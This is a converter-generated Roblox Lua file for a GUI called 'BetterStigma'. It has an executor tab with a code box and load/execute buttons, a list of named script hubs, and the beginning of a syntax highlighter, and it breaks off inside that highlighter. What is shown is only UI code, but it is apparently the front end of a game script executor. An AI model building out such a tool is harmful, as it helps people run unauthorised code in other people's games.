--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 56 | Scripts: 17 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.BS
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[BS]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.BS.win7
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Visible"] = false;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Size"] = UDim2.new(0, 379, 0, 237);
G2L["2"]["Position"] = UDim2.new(0.31732, 0, 0.28894, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[win7]];
G2L["2"]["BackgroundTransparency"] = 0.8;


-- StarterGui.BS.win7.UIGradient
G2L["3"] = Instance.new("UIGradient", G2L["2"]);
G2L["3"]["Rotation"] = 70;
G2L["3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(0.253, Color3.fromRGB(171, 171, 171)),ColorSequenceKeypoint.new(0.481, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(0.739, Color3.fromRGB(160, 160, 160)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};


-- StarterGui.BS.win7.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["Transparency"] = 0.8;
G2L["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.BS.win7.UICorner
G2L["5"] = Instance.new("UICorner", G2L["2"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 3);


-- StarterGui.BS.win7.MAIN
G2L["6"] = Instance.new("Frame", G2L["2"]);
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Size"] = UDim2.new(0, 365, 0, 210);
G2L["6"]["Position"] = UDim2.new(0.02111, 0, 0.08861, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(101, 101, 101);
G2L["6"]["Name"] = [[MAIN]];


-- StarterGui.BS.win7.MAIN.ImageLabel
G2L["7"] = Instance.new("ImageLabel", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["7"]["Image"] = [[rbxassetid://522337107]];
G2L["7"]["Size"] = UDim2.new(0, 70, 0, 70);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Position"] = UDim2.new(0.03014, 0, 0.09048, 0);


-- StarterGui.BS.win7.MAIN.ImageLabel.ImageLabel
G2L["8"] = Instance.new("ImageLabel", G2L["7"]);
G2L["8"]["ZIndex"] = 0;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8"]["Image"] = [[rbxassetid://85885164445922]];
G2L["8"]["Size"] = UDim2.new(0, 90, 0, 90);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["Position"] = UDim2.new(-0.15357, 0, -0.15357, 0);


-- StarterGui.BS.win7.MAIN.ImageLabel.ImageLabel.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);



-- StarterGui.BS.win7.MAIN.TextLabel
G2L["a"] = Instance.new("TextLabel", G2L["6"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["TextStrokeTransparency"] = 0;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextScaled"] = true;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[BetterStigma]];
G2L["a"]["Position"] = UDim2.new(0.24658, 0, 0, 0);


-- StarterGui.BS.win7.MAIN.TextLabel
G2L["b"] = Instance.new("TextLabel", G2L["6"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["TextStrokeTransparency"] = 0;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(0, 200, 0, 18);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[SUPER FEBIPAZ SOON!!]];
G2L["b"]["Position"] = UDim2.new(0.24658, 0, 0.18571, 0);


-- StarterGui.BS.win7.MAIN.op
G2L["c"] = Instance.new("Frame", G2L["6"]);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Size"] = UDim2.new(0, 275, 0, 32);
G2L["c"]["Position"] = UDim2.new(0.24762, 0, 0.31007, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[op]];


-- StarterGui.BS.win7.MAIN.op.UIListLayout
G2L["d"] = Instance.new("UIListLayout", G2L["c"]);
G2L["d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["d"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.BS.win7.MAIN.op.TextButton
G2L["e"] = Instance.new("TextButton", G2L["c"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0, 44, 0, 32);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[executor]];


-- StarterGui.BS.win7.MAIN.op.TextButton.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);



-- StarterGui.BS.win7.MAIN.op.TextButton
G2L["10"] = Instance.new("TextButton", G2L["c"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextScaled"] = true;
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 44, 0, 32);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[scripts]];


-- StarterGui.BS.win7.MAIN.op.TextButton.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.BS.win7.MAIN.Frames
G2L["12"] = Instance.new("Frame", G2L["6"]);
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Size"] = UDim2.new(0, 348, 0, 102);
G2L["12"]["Position"] = UDim2.new(0.03917, 0, 0.48412, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Name"] = [[Frames]];


-- StarterGui.BS.win7.MAIN.Frames.executor
G2L["13"] = Instance.new("Frame", G2L["12"]);
G2L["13"]["Visible"] = false;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["Size"] = UDim2.new(0, 348, 0, 102);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[executor]];


-- StarterGui.BS.win7.MAIN.Frames.executor.TextBox
G2L["14"] = Instance.new("TextBox", G2L["13"]);
G2L["14"]["CursorPosition"] = -1;
G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["14"]["TextWrapped"] = true;
G2L["14"]["TextSize"] = 10;
G2L["14"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/RobotoMono.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["Size"] = UDim2.new(0, 152, 0, 88);
G2L["14"]["Position"] = UDim2.new(0.01724, 0, 0.06863, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[]];


-- StarterGui.BS.win7.MAIN.Frames.executor.TextBox.LocalScript
G2L["15"] = Instance.new("LocalScript", G2L["14"]);



-- StarterGui.BS.win7.MAIN.Frames.executor.TextBox.TextLabel
G2L["16"] = Instance.new("TextLabel", G2L["14"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 10;
G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["16"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/RobotoMono.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["RichText"] = true;
G2L["16"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[]];


-- StarterGui.BS.win7.MAIN.Frames.executor.inj
G2L["17"] = Instance.new("TextButton", G2L["13"]);
G2L["17"]["TextSize"] = 14;
G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["Size"] = UDim2.new(0, 172, 0, 23);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[LOAD]];
G2L["17"]["Name"] = [[inj]];
G2L["17"]["Position"] = UDim2.new(0.47989, 0, 0.06863, 0);


-- StarterGui.BS.win7.MAIN.Frames.executor.exe
G2L["18"] = Instance.new("TextButton", G2L["13"]);
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["Size"] = UDim2.new(0, 45, 0, 23);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[exe]];
G2L["18"]["Name"] = [[exe]];
G2L["18"]["Position"] = UDim2.new(0.47989, 0, 0.36275, 0);


-- StarterGui.BS.win7.MAIN.Frames.executor.execlip
G2L["19"] = Instance.new("TextButton", G2L["13"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextScaled"] = true;
G2L["19"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["Size"] = UDim2.new(0, 45, 0, 23);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[exe CLIPBOARD]];
G2L["19"]["Name"] = [[execlip]];
G2L["19"]["Position"] = UDim2.new(0.62931, 0, 0.36275, 0);


-- StarterGui.BS.win7.MAIN.Frames.executor.cls
G2L["1a"] = Instance.new("TextButton", G2L["13"]);
G2L["1a"]["TextWrapped"] = true;
G2L["1a"]["TextSize"] = 14;
G2L["1a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["Size"] = UDim2.new(0, 45, 0, 23);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Text"] = [[cls]];
G2L["1a"]["Name"] = [[cls]];
G2L["1a"]["Position"] = UDim2.new(0.47989, 0, 0.64706, 0);


-- StarterGui.BS.win7.MAIN.Frames.executor.LocalScript
G2L["1b"] = Instance.new("LocalScript", G2L["13"]);



-- StarterGui.BS.win7.MAIN.Frames.scripts
G2L["1c"] = Instance.new("Frame", G2L["12"]);
G2L["1c"]["Visible"] = false;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["Size"] = UDim2.new(0, 348, 0, 102);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Name"] = [[scripts]];


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame
G2L["1d"] = Instance.new("ScrollingFrame", G2L["1c"]);
G2L["1d"]["Active"] = true;
G2L["1d"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.UIListLayout
G2L["1e"] = Instance.new("UIListLayout", G2L["1d"]);
G2L["1e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton
G2L["1f"] = Instance.new("TextButton", G2L["1d"]);
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[herbert hub]];


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton
G2L["21"] = Instance.new("TextButton", G2L["1d"]);
G2L["21"]["TextSize"] = 14;
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[herbert gui]];


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton
G2L["23"] = Instance.new("TextButton", G2L["1d"]);
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[ssp]];


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
G2L["24"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton
G2L["25"] = Instance.new("TextButton", G2L["1d"]);
G2L["25"]["TextSize"] = 14;
G2L["25"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[project segmav4]];


-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
G2L["26"] = Instance.new("LocalScript", G2L["25"]);



-- StarterGui.BS.win7.MAIN.LocalScript
G2L["27"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.BS.win7.title
G2L["28"] = Instance.new("TextLabel", G2L["2"]);
G2L["28"]["TextStrokeTransparency"] = 0;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 14;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Size"] = UDim2.new(0, 84, 0, 21);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[BetterStigma]];
G2L["28"]["Name"] = [[title]];
G2L["28"]["Position"] = UDim2.new(0.02111, 0, 0, 0);


-- StarterGui.BS.win7.close
G2L["29"] = Instance.new("TextButton", G2L["2"]);
G2L["29"]["TextStrokeTransparency"] = 0;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Jura.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["29"]["Size"] = UDim2.new(0, 34, 0, 13);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[]];
G2L["29"]["Name"] = [[close]];
G2L["29"]["Position"] = UDim2.new(0.89446, 0, 0.01688, 0);


-- StarterGui.BS.win7.close.UICorner
G2L["2a"] = Instance.new("UICorner", G2L["29"]);
G2L["2a"]["CornerRadius"] = UDim.new(0, 2);


-- StarterGui.BS.win7.close.UIGradient
G2L["2b"] = Instance.new("UIGradient", G2L["29"]);
G2L["2b"]["Rotation"] = 90;
G2L["2b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 176, 176)),ColorSequenceKeypoint.new(0.427, Color3.fromRGB(255, 195, 195)),ColorSequenceKeypoint.new(0.452, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.474, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(139, 41, 41))};


-- StarterGui.BS.win7.close.TextLabel
G2L["2c"] = Instance.new("TextLabel", G2L["29"]);
G2L["2c"]["TextStrokeTransparency"] = 0;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 12;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundTransparency"] = 1;
G2L["2c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[x]];


-- StarterGui.BS.win7.close.UIStroke
G2L["2d"] = Instance.new("UIStroke", G2L["29"]);
G2L["2d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.BS.win7.close.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["29"]);



-- StarterGui.BS.win7.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.BS.win7.LocalScript
G2L["30"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.BS.win7.LocalScript
G2L["31"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.BS.TextButton
G2L["32"] = Instance.new("ImageButton", G2L["1"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["Image"] = [[rbxassetid://522337107]];
G2L["32"]["Size"] = UDim2.new(0, 60, 0, 60);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Name"] = [[TextButton]];
G2L["32"]["Position"] = UDim2.new(0.12913, 0, 0.09422, 0);


-- StarterGui.BS.TextButton.UICorner
G2L["33"] = Instance.new("UICorner", G2L["32"]);
G2L["33"]["CornerRadius"] = UDim.new(0, 3);


-- StarterGui.BS.TextButton.UIGradient
G2L["34"] = Instance.new("UIGradient", G2L["32"]);
G2L["34"]["Rotation"] = 70;
G2L["34"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(0.253, Color3.fromRGB(171, 171, 171)),ColorSequenceKeypoint.new(0.481, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(0.739, Color3.fromRGB(160, 160, 160)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};


-- StarterGui.BS.TextButton.UIStroke
G2L["35"] = Instance.new("UIStroke", G2L["32"]);
G2L["35"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["35"]["Color"] = Color3.fromRGB(116, 255, 0);


-- StarterGui.BS.TextButton.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.BS.TextButton.LocalScript
G2L["37"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.BS.TextButton.LocalScript
G2L["38"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.BS.win7.MAIN.ImageLabel.ImageLabel.LocalScript
local function C_9()
local script = G2L["9"];
	while task.wait(0.01) do script.Parent.Rotation +=1 end
end;
task.spawn(C_9);
-- StarterGui.BS.win7.MAIN.op.TextButton.LocalScript
local function C_f()
local script = G2L["f"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frames[script.Parent.Text].Visible=true
		for _, v in pairs(script.Parent.Parent.Parent.Frames:GetChildren()) do
			if v:IsA('Frame') and v.Name ~= script.Parent.Text then
				v.Visible=false
			end
		end
	end)
end;
task.spawn(C_f);
-- StarterGui.BS.win7.MAIN.op.TextButton.LocalScript
local function C_11()
local script = G2L["11"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Frames[script.Parent.Text].Visible=true
		for _, v in pairs(script.Parent.Parent.Parent.Frames:GetChildren()) do
			if v:IsA('Frame') and v.Name ~= script.Parent.Text then
				v.Visible=false
			end
		end
	end)
end;
task.spawn(C_11);
-- StarterGui.BS.win7.MAIN.Frames.executor.TextBox.LocalScript
local function C_15()
local script = G2L["15"];
	function a()
		local highlighter = {}
		local keywords = {
			lua = {
				"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
				"local", "return", "function", "export"
			},
			rbx = {
				"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
				"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
				"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
				"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
				"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
			},
			operators = {
				"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":"
			}
		}
	
		local colors = {
			numbers = Color3.fromRGB(255, 198, 0),
			boolean = Color3.fromRGB(214, 128, 23),
			operator = Color3.fromRGB(232, 210, 40),
			lua = Color3.fromRGB(160, 87, 248),
			rbx = Color3.fromRGB(146, 180, 253),
			str = Color3.fromRGB(56, 241, 87),
			comment = Color3.fromRGB(103, 110, 149),
			null = Color3.fromRGB(79, 79, 79),
			call = Color3.fromRGB(130, 170, 255),
			self_call = Color3.fromRGB(227, 201, 141),
			local_color = Color3.fromRGB(199, 146, 234),
			function_color = Color3.fromRGB(241, 122, 124),
			self_color = Color3.fromRGB(146, 134, 234),
			local_property = Color3.fromRGB(129, 222, 255),
		}
	
		local function createKeywordSet(keywords)
			local keywordSet = {}
			for _, keyword in ipairs(keywords) do
				keywordSet[keyword] = true
			end
			return keywordSet
		end
	
		local luaSet = createKeywordSet(keywords.lua)
		local rbxSet = createKeywordSet(keywords.rbx)
		local operatorsSet = createKeywordSet(keywords.operators)
	
		local function getHighlight(tokens, index)
			local token = tokens[index]
	
			if colors[token .. "_color"] then
				return colors[token .. "_color"]
			end
	
			if tonumber(token) then
				return colors.numbers
			elseif token == "nil" then
				return colors.null
			elseif token:sub(1, 2) == "--" then
				return colors.comment
			elseif operatorsSet[token] then
				return colors.operator
			elseif luaSet[token] then
				return colors.rbx
			elseif rbxSet[token] then
				return colors.lua
			elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
				return colors.str
			elseif token == "true" or token == "false" then
				return colors.boolean
			end
	
			if tokens[index + 1] == "(" then
				if tokens[index - 1] == ":" then
					return colors.self_call
				end
	
				return colors.call
			end
	
			if tokens[index - 1] == "." then
				if tokens[index - 2] == "Enum" then
					return colors.rbx
				end
	
				return colors.local_property
			end
		end
	
		function highlighter.run(source)
			local tokens = {}
			local currentToken = ""
	
			local inString = false
			local inComment = false
			local commentPersist = false
	
			for i = 1, #source do
				local character = source:sub(i, i)
	
				if inComment then
					if character == "\n" and not commentPersist then
						table.insert(tokens, currentToken)
						table.insert(tokens, character)
						currentToken = ""
	
						inComment = false
					elseif source:sub(i - 1, i) == "]]" and commentPersist then
						currentToken ..= "]"
	
						table.insert(tokens, currentToken)
						currentToken = ""
	
						inComment = false
						commentPersist = false
					else
						currentToken = currentToken .. character
					end
				elseif inString then
					if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
						currentToken = currentToken .. character
						inString = false
					else
						currentToken = currentToken .. character
					end
				else
					if source:sub(i, i + 1) == "--" then
						table.insert(tokens, currentToken)
						currentToken = "-"
						inComment = true
						commentPersist = source:sub(i + 2, i + 3) == "[["
					elseif character == "\"" or character == "\'" then
						table.insert(tokens, currentToken)
						currentToken = character
						inString = character
					elseif operatorsSet[character] then
						table.insert(tokens, currentToken)
						table.insert(tokens, character)
						currentToken = ""
					elseif character:match("[%w_]") then
						currentToken = currentToken .. character
					else
						table.insert(tokens, currentToken)
						table.insert(tokens, character)
						currentToken = ""
					end
				end
			end
	
			table.insert(tokens, currentToken)
	
			local highlighted = {}
	
			for i, token in ipairs(tokens) do
				local highlight = getHighlight(tokens, i)
	
				if highlight then
					local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))
	
					table.insert(highlighted, syntax)
				else
					table.insert(highlighted, token)
